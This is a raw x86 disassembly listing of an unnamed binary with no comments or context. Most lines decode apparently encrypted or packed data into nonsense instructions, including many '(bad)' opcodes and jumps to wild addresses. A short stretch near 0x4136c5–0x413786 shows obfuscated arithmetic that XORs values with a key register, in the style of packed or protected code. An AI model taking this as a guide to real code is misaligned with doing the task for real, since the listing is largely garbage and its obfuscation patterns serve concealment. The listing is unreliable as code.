  4131bf:	add    edi,DWORD PTR [ebp+0x5b161d20]
  4131c5:	sub    BYTE PTR [ecx+0x61],dh
  4131c8:	pop    ds
  4131c9:	pushf  
  4131ca:	retf   
  4131cb:	jp     0x413169
  4131cd:	pop    edi
  4131ce:	pop    esp
  4131cf:	test   al,0xcb
  4131d1:	neg    ebp
  4131d3:	push   0x848a4378
  4131d8:	fmul   QWORD PTR [edi]
  4131da:	xacquire lock adc BYTE PTR gs:[ecx-0x47d61bcf],cl
  4131e3:	mov    ds:0x63d2c4aa,al
  4131e8:	inc    edx
  4131e9:	je     0x413204
  4131eb:	jmp    0x4131d7
  4131ed:	push   es
  4131ee:	pop    ebx
  4131ef:	sub    al,0xf4
  4131f1:	xor    eax,0x7777f224
  4131f6:	mov    al,0x30
  4131f8:	pop    ebx
  4131f9:	inc    ebx
  4131fa:	mov    ch,0xe9
  4131fc:	sub    esi,DWORD PTR [esi]
  4131fe:	jbe    0x41327e
  413200:	xor    eax,DWORD PTR [ebx-0x58]
  413203:	pop    ebp
  413204:	jp     0x4131b8
  413206:	pop    eax
  413207:	popa   
  413208:	add    edx,DWORD PTR [edx]
  41320a:	mov    eax,0x57dcf96a
  41320f:	fstp   QWORD PTR [eax+0x53]
  413212:	sbb    eax,0x8d6ce048
  413217:	cmp    al,0xea
  413219:	out    0xc6,al
  41321b:	aad    0x33
  41321d:	xlat   BYTE PTR ds:[ebx]
  41321e:	(bad)
  413221:	sar    BYTE PTR [ebx-0xbb39e3d],1
  413227:	loopne 0x413222
  413229:	call   0x639465ba
  41322e:	xor    bl,BYTE PTR [eax]
  413230:	jno    0x413231
  413232:	dec    esp
  413233:	ins    DWORD PTR es:[edi],dx
  413234:	leave  
  413235:	mov    edx,0x28e19b03
  41323a:	add    bl,BYTE PTR ds:0xa46887d2
  413240:	jns    0x4132b6
  413242:	lahf   
  413243:	pop    edx
  413244:	jl     0x4132bd
  413246:	xchg   edi,eax
  413247:	cli    
  413248:	mov    ?,esp
  41324a:	mov    eax,0xa535cf48
  41324f:	dec    eax
  413250:	stos   DWORD PTR es:[edi],eax
  413251:	daa    
  413252:	(bad)  
  413253:	jmp    0x67c846e3
  413258:	fcom   QWORD PTR [edi+edi*1-0x35c36ed8]
  41325f:	icebp  
  413260:	sbb    eax,0xd68974ba
  413265:	xor    eax,0xe75a6037
  41326a:	pop    ebp
  41326b:	pop    ss
  41326c:	jbe    0x413234
  41326e:	enter  0x33a0,0x14
  413272:	sub    al,0x7
  413274:	jmp    0x41326a
  413276:	jl     0x41324f
  413278:	stos   BYTE PTR es:[edi],al
  413279:	or     edi,DWORD PTR [edx-0x43f8df7f]
  41327f:	push   ss
  413280:	imul   ebx,DWORD PTR [edi-0x346be285],0xffffffde
  413287:	bound  ebp,QWORD PTR [ebx-0x12]
  41328a:	cmp    BYTE PTR [ecx],cl
  41328c:	sbb    edi,DWORD PTR [eax+0x61ae182f]
  413292:	cmp    eax,DWORD PTR ds:0x52afa2e4
  413298:	mov    al,0xb9
  41329a:	xor    BYTE PTR [edi-0x282ee8ba],bl
  4132a0:	cmp    eax,0x38520ca9
  4132a5:	pop    edi
  4132a6:	addr16 fcmovne st,st(3)
  4132aa:	loop   0x413247
  4132ac:	dec    esi
  4132ad:	sub    BYTE PTR [ebx+eax*8-0x3d],ah
  4132b1:	jmp    0x20ccf415
  4132b6:	cmp    dh,BYTE PTR [edx+0x31]
  4132b9:	and    eax,0xc216f2b6
  4132be:	mov    al,ds:0xb960814d
  4132c3:	out    dx,al
  4132c4:	sub    ecx,DWORD PTR [ecx+0x58]
  4132c7:	cmp    edx,DWORD PTR [ebx-0x31]
  4132ca:	and    ebp,DWORD PTR [esi+0x63]
  4132cd:	pop    edx
  4132ce:	jns    0x4132bb
  4132d0:	imul   edx,ebp,0x3421b97f
  4132d6:	push   ebp
  4132d7:	stc    
  4132d8:	fs out 0xaf,eax
  4132db:	dec    ecx
  4132dc:	out    dx,al
  4132dd:	enter  0x6fbf,0x0
  4132e1:	ds xor eax,0x9e9990f2
  4132e7:	sti    
  4132e8:	inc    eax
  4132e9:	sub    BYTE PTR [eax-0x487c98c1],al
  4132ef:	popf   
  4132f0:	push   edi
  4132f1:	ja     0x4132ef
  4132f3:	(bad)  
  4132f4:	sbb    BYTE PTR [esi],dl
  4132f6:	cmp    edi,DWORD PTR [ecx-0x4]
  4132f9:	inc    edi
  4132fa:	xor    al,0x5e
  4132fc:	cmp    ebp,DWORD PTR [edi+0x28]
  4132ff:	xchg   esi,eax
  413300:	sub    dl,BYTE PTR [ebp+0x5d]
  413303:	and    al,0x98
  413305:	or     BYTE PTR [ebx],dh
  413307:	mov    bh,0x6d
  413309:	into   
  41330a:	ss out dx,al
  41330c:	std    
  41330d:	ret    0x5994
  413310:	fldcw  WORD PTR [ecx]
  413312:	push   ebp
  413313:	ins    BYTE PTR es:[edi],dx
  413314:	outs   dx,BYTE PTR ds:[esi]
  413315:	loopne 0x4132a0
  413317:	das    
  413318:	mov    ch,0x9a
  41331a:	push   ebx
  41331b:	mov    esi,DWORD PTR [esi]
  41331d:	(bad)  
  41331e:	dec    eax
  41331f:	pop    edx
  413320:	dec    BYTE PTR [edi-0x1ac78ee3]
  413326:	sub    esi,0xffffff9b
  413329:	(bad)
  41332d:	mov    esi,0x950541fa
  413332:	push   eax
  413333:	pop    esi
  413334:	sbb    al,BYTE PTR ds:[esi]
  413337:	loopne 0x41336f
  413339:	adc    BYTE PTR [esi-0x51],al
  41333c:	mov    edi,0x28f02fa8
  413341:	mov    DWORD PTR [eax-0x507a1206],0x9b0e4780
  41334b:	adc    al,0x3f
  41334d:	cmp    BYTE PTR [eax+0x5bf2710a],bl
  413353:	fisub  WORD PTR [edx-0x6bcdbc62]
  413359:	inc    ebx
  41335a:	pop    es
  41335b:	push   edx
  41335c:	mov    eax,ds:0xd9724cf2
  413361:	(bad)  
  413362:	sbb    DWORD PTR [ebx-0x45ffb283],ebx
  413368:	push   es
  413369:	push   es
  41336a:	int3   
  41336b:	pop    esp
  41336c:	add    DWORD PTR [ecx-0x9149680],ebp
  413372:	adc    edi,DWORD PTR [esi+0x150e3a5f]
  413378:	call   0x41ce:0x643fc498
  41337f:	xlat   BYTE PTR ds:[ebx]
  413380:	scas   eax,DWORD PTR es:[edi]
  413381:	cmp    esp,DWORD PTR [edi]
  413383:	in     eax,0x70
  413385:	and    DWORD PTR [edi],eax
  413387:	or     DWORD PTR ds:0xd1bff052,esp
  41338d:	jle    0x41337f
  41338f:	or     dh,BYTE PTR [edx]
  413391:	(bad)  
  413393:	pop    esp
  413394:	add    al,0xaf
  413396:	je     0x41331a
  413398:	xchg   BYTE PTR fs:[edx-0x4a],ch
  41339c:	mov    fs,edx
  41339e:	jp     0x413328
  4133a0:	mov    al,ds:0x9bb64f09
  4133a5:	mov    bl,0x87
  4133a7:	cmc    
  4133a8:	push   ecx
  4133a9:	push   esp
  4133aa:	imul   esp,DWORD PTR [edi],0x12
  4133ad:	dec    esp
  4133ae:	and    bh,BYTE PTR [ebx+0x35]
  4133b1:	lds    edx,FWORD PTR [ecx]
  4133b3:	repz cwde 
  4133b5:	shr    BYTE PTR [edi],0xd7
  4133b8:	ss push ebx
  4133ba:	aad    0x8f
  4133bc:	aam    0xdf
  4133be:	push   cs
  4133bf:	mov    ecx,0x65f7b7b
  4133c4:	dec    esp
  4133c5:	pop    ebx
  4133c6:	push   cs
  4133c7:	xchg   ecx,eax
  4133c8:	or     eax,0x99d90952
  4133cd:	fistp  QWORD PTR [eax+0xe]
  4133d0:	in     al,0x64
  4133d2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4133d4:	cmp    al,0x33
  4133d6:	xchg   edx,eax
  4133d7:	cmp    BYTE PTR ss:[esi-0x189eddae],bh
  4133de:	xchg   edi,eax
  4133df:	lahf   
  4133e0:	xchg   edx,eax
  4133e1:	inc    BYTE PTR [eax-0x59]
  4133e4:	inc    ebp
  4133e5:	xor    al,0xf6
  4133e7:	add    bl,BYTE PTR [edi-0x79793cb]
  4133ed:	adc    bl,bl
  4133ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133f0:	pusha  
  4133f1:	scas   al,BYTE PTR es:[edi]
  4133f2:	dec    eax
  4133f3:	or     al,0x40
  4133f5:	ret    
  4133f6:	jns    0x413422
  4133f8:	jae    0x413417
  4133fa:	pop    esi
  4133fb:	retf   
  4133fc:	or     al,0x54
  4133fe:	mov    esp,0xdc5c05ec
  413403:	xchg   edx,eax
  413404:	retf   
  413405:	push   esp
  413406:	clc    
  413407:	push   cs
  413408:	mov    dh,0x26
  41340a:	arpl   WORD PTR [ebx-0x1c3c32f],bp
  413410:	fdiv   DWORD PTR [eax+0x51]
  413413:	cwde   
  413414:	iret   
  413415:	sub    ebx,ebx
  413417:	popf   
  413418:	enter  0x6313,0xc9
  41341c:	jge    0x41347c
  41341e:	add    ebx,DWORD PTR [edi+0x30c22a7c]
  413424:	not    DWORD PTR [edx]
  413426:	imul   BYTE PTR [edi]
  413428:	or     DWORD PTR ss:[edx+0x3d],edx
  41342c:	je     0x4133db
  41342e:	inc    esp
  41342f:	leave  
  413430:	jns    0x413440
  413432:	mov    cl,BYTE PTR [edi-0x2d]
  413435:	cs adc edx,DWORD PTR cs:[ebx+0x4]
  41343a:	pop    edx
  41343b:	push   esi
  41343c:	(bad)  
  41343d:	je     0x413406
  41343f:	aam    0x41
  413441:	stos   DWORD PTR es:[edi],eax
  413442:	retf   
  413443:	popf   
  413444:	and    al,BYTE PTR [esp+esi*8-0x74]
  413448:	cwde   
  413449:	sbb    al,0x80
  41344b:	inc    edx
  41344c:	stos   DWORD PTR es:[edi],eax
  41344d:	mov    esi,0xf3acd588
  413452:	jmp    0xfa7d57a1
  413457:	iret   
  413458:	mov    bl,0x2b
  41345a:	sub    eax,DWORD PTR [ebp+0x5b]
  41345d:	mov    edx,0x83365761
  413462:	jmp    0xa8fb:0xa86c4542
  413469:	xor    al,ch
  41346b:	into   
  41346c:	and    ah,al
  41346e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41346f:	pop    esp
  413470:	repnz add eax,0x5e58c3ec
  413476:	cmp    dh,ch
  413478:	ss ret 0x8f2a
  41347c:	aaa    
  41347d:	lahf   
  41347e:	inc    esi
  41347f:	sub    DWORD PTR [edi+ebx*8],ecx
  413482:	dec    edx
  413483:	test   al,0x24
  413485:	jl     0x413495
  413487:	or     ecx,edx
  413489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41348a:	imul   esi,DWORD PTR [eax+0x27],0xdb935301
  413491:	xchg   DWORD PTR [ecx-0x561476b5],edi
  413497:	mov    dh,0x16
  413499:	xchg   esi,eax
  41349a:	mov    cl,0x2a
  41349c:	aam    0xe5
  41349e:	imul   eax,DWORD PTR [edx],0x76
  4134a1:	pop    esp
  4134a2:	xor    DWORD PTR [ecx],eax
  4134a4:	mov    ebp,0xdefa216
  4134a9:	pop    ds
  4134aa:	dec    esp
  4134ab:	movq   mm3,QWORD PTR [ebx]
  4134ae:	mov    cs,WORD PTR [ecx+0x1adfd64]
  4134b4:	push   0x97d64742
  4134b9:	mov    bl,0xb
  4134bb:	sbb    eax,0x50830c20
  4134c0:	push   ebx
  4134c1:	mov    cl,0x86
  4134c3:	fs ds loopne 0x41352b
  4134c7:	inc    ecx
  4134c8:	mov    esi,0x7fff73cf
  4134cd:	xlat   BYTE PTR ds:[ebx]
  4134ce:	ja     0x413519
  4134d0:	mov    dh,0x80
  4134d2:	pop    edi
  4134d3:	mov    ecx,0x53b87af7
  4134d8:	jmp    0x4134c3
  4134da:	scas   eax,DWORD PTR es:[edi]
  4134db:	retf   
  4134dc:	(bad)  
  4134dd:	jmp    0x6a78:0xa7228ecc
  4134e4:	(bad)  
  4134e5:	jo     0x413480
  4134e7:	inc    edi
  4134e8:	sub    ch,BYTE PTR [eax+0x2b]
  4134eb:	cmp    esi,DWORD PTR [ecx]
  4134ed:	xor    eax,0x6b9fc8a3
  4134f2:	mov    al,0xaf
  4134f4:	shl    DWORD PTR [eax+0x79],cl
  4134f7:	push   es
  4134f8:	enter  0xc074,0xfc
  4134fc:	inc    edx
  4134fd:	xchg   ecx,eax
  4134fe:	je     0x4134e6
  413500:	fnsave [bx+si+0x55]
  413504:	neg    ebp
  413506:	pop    ebx
  413507:	jb     0x4134ca
  413509:	mov    esi,0xe5dd304f
  41350e:	sub    eax,DWORD PTR ds:0x3f8be8a2
  413514:	sbb    dh,ah
  413516:	sbb    BYTE PTR cs:[ebx-0x16c17896],bl
  41351d:	mov    ds:0xdca720a0,al
  413522:	(bad)  
  413523:	fcmovnu st,st(1)
  413525:	icebp  
  413526:	xor    ah,0x65
  413529:	jne    0x4134f0
  41352b:	lods   eax,DWORD PTR ds:[esi]
  41352c:	loope  0x4134fa
  41352e:	shr    DWORD PTR [edx+0x3a],0x17
  413532:	loop   0x413564
  413534:	push   ds
  413535:	sbb    al,0x9b
  413537:	xchg   edi,eax
  413538:	sub    ecx,eax
  41353a:	pushf  
  41353b:	xor    al,0xdb
  41353d:	mov    ds:0x9dc2a4dc,eax
  413542:	push   ss
  413543:	(bad)  
  413544:	and    ecx,DWORD PTR [edi-0x7]
  413547:	pop    ds
  413548:	fsub   QWORD PTR [ebp+0x479ee3ae]
  41354e:	dec    edx
  41354f:	cld    
  413550:	bound  ecx,QWORD PTR [edi+0x7]
  413553:	ja     0x4134e1
  413555:	pushf  
  413556:	scas   eax,DWORD PTR es:[edi]
  413557:	mov    ecx,0x846293d4
  41355c:	out    0x61,al
  41355e:	mov    cl,0xfe
  413560:	test   DWORD PTR [edx],ecx
  413562:	int    0x55
  413564:	cwde   
  413565:	mov    dh,0xb1
  413567:	xor    ebx,DWORD PTR [edx-0x534a8faa]
  41356d:	xor    ebx,DWORD PTR [eax]
  41356f:	mov    al,ds:0xea23d592
  413574:	dec    edi
  413575:	pop    ebp
  413576:	mov    ebp,0x512658ae
  41357b:	pushf  
  41357c:	xor    bl,ch
  41357e:	dec    ebp
  41357f:	sti    
  413580:	int    0xc8
  413582:	adc    BYTE PTR [ecx],0x1a
  413585:	or     eax,0xda41250f
  41358a:	mov    al,ds:0xf808cec0
  41358f:	(bad)  
  413590:	jbe    0x4135f6
  413592:	mov    bh,0x4c
  413594:	xchg   edx,eax
  413595:	sbb    BYTE PTR [edi],0x1d
  413598:	lods   eax,DWORD PTR ds:[esi]
  413599:	(bad)  [esp+ecx*2]
  41359c:	and    ch,cl
  41359e:	imul   esi,DWORD PTR [ecx],0xffffff82
  4135a1:	jmp    0xd314aea3
  4135a6:	call   FWORD PTR [edx]
  4135a8:	or     al,0x0
  4135aa:	lock pop edx
  4135ac:	lods   al,BYTE PTR ds:[esi]
  4135ad:	cld    
  4135ae:	mov    ds:0x102a282b,eax
  4135b3:	retf   
  4135b4:	scas   al,BYTE PTR es:[edi]
  4135b5:	mov    al,ds:0xf735d5ac
  4135ba:	jno    0x41355f
  4135bc:	jp     0x4135a5
  4135be:	in     eax,0x92
  4135c0:	pop    ds
  4135c1:	in     al,dx
  4135c2:	dec    sp
  4135c4:	mov    BYTE PTR [ebp+0x61],bh
  4135c7:	sub    DWORD PTR [eax],0xffffff8c
  4135ca:	add    edi,DWORD PTR [edi+0x55]
  4135cd:	cmp    DWORD PTR [edi],eax
  4135cf:	inc    ebx
  4135d0:	or     eax,0x46cf3724
  4135d5:	or     al,0xa7
  4135d7:	cmp    al,0xc2
  4135d9:	push   eax
  4135da:	dec    esi
  4135db:	not    DWORD PTR [ecx-0x6c11eb62]
  4135e1:	leave  
  4135e2:	(bad)
  4135e5:	dec    ecx
  4135e6:	xor    eax,0xe7843cff
  4135eb:	lds    edi,FWORD PTR [edi-0x2c2b0398]
  4135f1:	fdivr  QWORD PTR [ebx-0x57]
  4135f4:	sbb    eax,0xc9b598fd
  4135f9:	inc    ecx
  4135fa:	add    al,0xed
  4135fc:	aam    0x71
  4135fe:	cwde   
  4135ff:	push   esi
  413600:	xchg   ebp,eax
  413601:	and    DWORD PTR [edx-0x22],ecx
  413604:	sbb    ebp,DWORD PTR [ebx-0x75]
  413607:	push   esp
  413608:	fucomip st,st(1)
  41360a:	xor    dl,BYTE PTR [ecx+0xf9882a]
  413610:	loopne 0x413667
  413612:	cmp    esp,DWORD PTR [edx-0x15]
  413615:	ror    BYTE PTR [ebp+0x22e91cd8],0x78
  41361c:	cmp    bl,BYTE PTR [ebx+ebx*4-0x37]
  413620:	rcl    BYTE PTR [ebx+eax*4],cl
  413623:	pop    eax
  413624:	adc    DWORD PTR [esi+0x14],esi
  413627:	outs   dx,DWORD PTR ds:[esi]
  413628:	fwait
  413629:	jmp    0x4103f5e5
  41362e:	jg     0x4136a0
  413630:	mov    bl,0xd4
  413632:	xchg   edx,eax
  413633:	shl    DWORD PTR [ebp+0x1c40d0a8],0xc1
  41363a:	mov    ebx,0xc7e398f3
  41363f:	(bad)  
  413640:	fild   DWORD PTR [edi]
  413642:	jmp    0x413683
  413644:	pop    ebp
  413645:	pop    gs
  413647:	xchg   ebx,eax
  413648:	push   es
  413649:	pop    ecx
  41364a:	cdq    
  41364b:	rol    BYTE PTR [ebp-0x5e],cl
  41364e:	cs pusha 
  413650:	cmp    al,0x98
  413652:	fxch   st(5)
  413654:	inc    eax
  413655:	ins    BYTE PTR es:[edi],dx
  413656:	mov    ds:0xae747f15,eax
  41365b:	pushf  
  41365c:	clc    
  41365d:	inc    ebp
  41365e:	out    dx,al
  41365f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413660:	clc    
  413661:	fnsave [ebx-0x55]
  413664:	adc    eax,edx
  413666:	hlt    
  413667:	or     esp,esi
  413669:	stos   BYTE PTR es:[edi],al
  41366a:	rol    BYTE PTR [ecx*4-0x2b6fce62],1
  413671:	push   esi
  413672:	or     edx,DWORD PTR [ecx+0x52]
  413675:	jp     0x4136e0
  413677:	inc    eax
  413678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413679:	sub    al,0xb1
  41367b:	dec    ebx
  41367c:	enter  0x8386,0xab
  413680:	add    BYTE PTR ds:[edi+0x5b1411af],dh
  413687:	ins    BYTE PTR es:[edi],dx
  413688:	add    DWORD PTR [ecx-0x80],0xceb21638
  41368f:	pop    ebp
  413690:	hlt    
  413691:	or     eax,0x4c4e31db
  413696:	sbb    BYTE PTR [ebp-0x3f],cl
  413699:	fild   WORD PTR [edx-0x66]
  41369c:	mov    esi,cs
  41369e:	xor    eax,0x8ace1c10
  4136a3:	dec    ebx
  4136a4:	mov    ebx,0x95cfda53
  4136a9:	jne    0x413716
  4136ab:	loop   0x4136f7
  4136ad:	cmovne esi,DWORD PTR [eax-0x1b]
  4136b1:	xor    al,0x6b
  4136b3:	or     esi,ebp
  4136b5:	xchg   DWORD PTR [eiz*2-0xbe1d63a],ecx
  4136bc:	arpl   WORD PTR [eax],si
  4136be:	(bad)  fs:[ebx-0x29cc0ba3]
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0xb8
  413798:	cmp    DWORD PTR [edi-0x48],ebx
  41379b:	mov    ds:0xcd62626b,al
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx+0x27]
  4137a4:	push   0xffffffbe
  4137a6:	cs scas eax,DWORD PTR es:[edi]
  4137a8:	fistp  DWORD PTR [eax-0x5b18c98c]
  4137ae:	imul   edi,esp,0xfffffffb
  4137b1:	mov    al,0xa2
  4137b3:	ins    BYTE PTR es:[edi],dx
  4137b4:	retf   
  4137b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137b6:	push   0xffffffc6
  4137b8:	push   ecx
  4137b9:	dec    edx
  4137ba:	sbb    al,0x7e
  4137bc:	fcomi  st,st(2)
  4137be:	ins    DWORD PTR es:[edi],dx
  4137bf:	rcr    DWORD PTR [edx+0x51],0xee
  4137c3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137c5:	in     al,0xfb
  4137c7:	fidiv  DWORD PTR [ecx]
  4137c9:	jge    0x41378d
  4137cb:	mov    ds:0xf39dd8a2,al
  4137d0:	mov    dh,0xa9
  4137d2:	sar    ebp,1
  4137d4:	cmp    DWORD PTR [eax+0x1d663bae],edi
  4137da:	popa   
  4137db:	push   0xc468c36d
  4137e0:	(bad)  
  4137e2:	int3   
  4137e3:	inc    ebx
  4137e4:	mov    edi,0x436f235b
  4137e9:	out    0x84,eax
  4137eb:	sbb    dl,0xb4
  4137ee:	(bad)
  4137f1:	pop    esp
  4137f2:	test   edi,ecx
  4137f4:	std    
  4137f5:	imul   esp,ecx,0x4a
  4137f8:	dec    ebx
  4137f9:	cli    
  4137fa:	int    0xd6
  4137fc:	sbb    eax,0xad4b56de
  413801:	inc    esp
  413802:	push   ecx
  413803:	push   ds
  413804:	out    0xec,eax
  413806:	add    al,0xf3
  413808:	dec    eax
  413809:	jl     0x4137bc
  41380b:	cmp    eax,0x11eced3a
  413810:	sub    ebx,0x58
  413813:	popf   
  413814:	pop    ss
  413815:	push   edx
  413816:	fisubr WORD PTR [ebx-0x6f]
  413819:	stos   DWORD PTR es:[edi],eax
  41381a:	dec    ebp
  41381b:	inc    edx
  41381c:	rcl    BYTE PTR [edx],0x45
  41381f:	mov    bh,0x99
  413821:	xchg   esp,eax
  413822:	inc    edx
  413823:	mov    edx,0x147ed3ca
  413828:	pop    edi
  413829:	pop    ecx
  41382a:	aaa    
  41382b:	fld    DWORD PTR [edi]
  41382d:	lock mov ebp,0xd3856cfa
  413833:	mov    dh,BYTE PTR [ebp+0x1e473e93]
  413839:	jp     0x4137eb
  41383b:	popa   
  41383c:	sbb    BYTE PTR [eax],0xd9
  41383f:	mov    eax,0x6f56285e
  413844:	push   edx
  413845:	test   esp,esi
  413847:	add    DWORD PTR [esi-0x7958f8],ebx
  41384d:	jnp    0x4138b7
  41384f:	out    0xfe,eax
  413851:	sub    BYTE PTR [edx],al
  413853:	dec    eax
  413854:	lea    ebp,[ecx+eax*1+0x16dcc321]
  41385b:	and    BYTE PTR [ecx-0x1e32e2e],dl
  413861:	mov    esi,0x72ed84e2
  413866:	and    eax,edi
  413868:	sbb    al,0xb4
  41386a:	js     0x41388e
  41386c:	or     edi,DWORD PTR [ecx+0x618e6e82]
  413872:	jne    0x413869
  413874:	xchg   edx,eax
  413875:	clc    
  413876:	inc    edx
  413877:	sbb    edi,DWORD PTR [eax+ecx*8-0x488f9d03]
  41387e:	jbe    0x413842
  413880:	or     al,0x75
  413882:	iret   
  413883:	mov    al,BYTE PTR [eax+edx*2+0x1e]
  413887:	jg     0x413849
  413889:	mov    ebx,0x97982cae
  41388e:	mov    ds:0xbc6bcad3,eax
  413893:	(bad)  
  413894:	dec    esp
  413895:	mov    ebp,0x821b9dec
  41389a:	retf   0x360d
  41389d:	jno    0x413907
  41389f:	in     al,0x96
  4138a1:	in     eax,0x62
  4138a3:	cwde   
  4138a4:	mov    edx,0xff12b9e6
  4138a9:	cmp    DWORD PTR [edi],0x2bf82eb4
  4138af:	xor    ebx,DWORD PTR [edx+0x49]
  4138b2:	mov    ds:0xad85c27a,eax
  4138b7:	repnz xor ah,al
  4138ba:	stos   DWORD PTR es:[edi],eax
  4138bb:	fisttp QWORD PTR [ebx]
  4138bd:	jg     0x4138e4
  4138bf:	loop   0x41384b
  4138c1:	add    DWORD PTR [ecx+0x73fc06ba],ecx
  4138c7:	lahf   
  4138c8:	cld    
  4138c9:	into   
  4138ca:	jp     0x41386e
  4138cc:	sbb    ah,BYTE PTR [edi+0x4c]
  4138cf:	and    DWORD PTR [edx+0x1d2c17db],ebx
  4138d5:	dec    ebp
  4138d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138d7:	mov    esi,DWORD PTR [eax+0x1d]
  4138da:	pop    ecx
  4138db:	mov    ?,WORD PTR [ebx]
  4138dd:	pop    esi
  4138de:	popa   
  4138df:	pusha  
  4138e0:	test   DWORD PTR [ecx+esi*2],ecx
  4138e3:	add    al,0x82
  4138e5:	dec    ebx
  4138e6:	jne    0x413886
  4138e8:	mov    ds:0x42942c13,eax
  4138ed:	jmp    0x9267794d
  4138f2:	scas   al,BYTE PTR es:[edi]
  4138f3:	add    edi,esp
  4138f5:	push   esp
  4138f6:	mov    WORD PTR [edx-0x6a],gs
  4138f9:	loop   0x413959
  4138fb:	adc    DWORD PTR [edi+ebp*1+0x5],esp
  4138ff:	data16 xor dh,BYTE PTR [edx-0x4f]
  413903:	or     ch,bl
  413905:	and    DWORD PTR [ecx+0x65454307],ebx
  41390b:	xchg   esp,eax
  41390c:	mov    esp,0x65a64970
  413911:	dec    ecx
  413912:	adc    al,0xfb
  413914:	mov    BYTE PTR [eax+0x5216bb7b],bh
  41391a:	scas   al,BYTE PTR es:[edi]
  41391b:	js     0x413963
  41391d:	mov    edi,0x580664ed
  413922:	fimul  WORD PTR [eax]
  413924:	pop    es
  413925:	fwait
  413926:	mov    edx,0xa062ac6
  41392b:	xlat   BYTE PTR ds:[ebx]
  41392c:	pop    esp
  41392d:	or     DWORD PTR [ebx-0x9],ecx
  413930:	xchg   DWORD PTR [ecx],edx
  413932:	mov    ah,0xbf
  413934:	or     bh,0x73
  413937:	xor    bl,0x51
  41393a:	jmp    0xa7e2:0xa1cba1a3
  413941:	aam    0xec
  413943:	dec    esp
  413944:	pop    ebp
  413945:	mov    eax,0x9dd4ab51
  41394a:	mov    ebx,0x1a512986
  41394f:	aas    
  413950:	out    dx,al
  413951:	cmp    BYTE PTR [edi+esi*2-0x30],cl
  413955:	sbb    eax,0x81350cf6
  41395a:	rcr    BYTE PTR [edi+0x21ddf3bf],1
  413960:	add    BYTE PTR [eax+0x4],ch
  413963:	add    edx,DWORD PTR [eax-0x6d]
  413966:	or     esp,ebx
  413968:	mov    ah,bl
  41396a:	sti    
  41396b:	aam    0x4c
  41396d:	and    eax,0xb7b78be1
  413972:	sbb    eax,0xc5968f8a
  413977:	xchg   edi,eax
  413978:	mov    dl,0x7f
  41397a:	mov    al,ds:0xf25a0b50
  41397f:	data16 xor al,0x5d
  413982:	bound  edx,QWORD PTR [ebp+ecx*2-0x461f995]
  413989:	pop    ds
  41398a:	jle    0x4139b3
  41398c:	pop    ebx
  41398d:	push   eax
  41398e:	pop    ebx
  41398f:	mov    BYTE PTR [eax-0x12317ad9],dl
  413995:	inc    ebp
  413996:	push   0xffffffb2
  413998:	pop    esp
  413999:	in     eax,dx
  41399a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41399b:	push   ebx
  41399c:	cmp    esi,eax
  41399e:	mov    al,BYTE PTR [ebx+0x36]
  4139a1:	mov    ch,0x31
  4139a3:	mov    ecx,0x6d3136a9
  4139a8:	mov    eax,0xe6fca7c9
  4139ad:	mov    ah,0x3
  4139af:	sub    BYTE PTR [edi+0x50],ch
  4139b2:	xchg   cl,bh
  4139b4:	out    dx,eax
  4139b5:	and    DWORD PTR [esi-0x170162e7],esp
  4139bb:	push   es
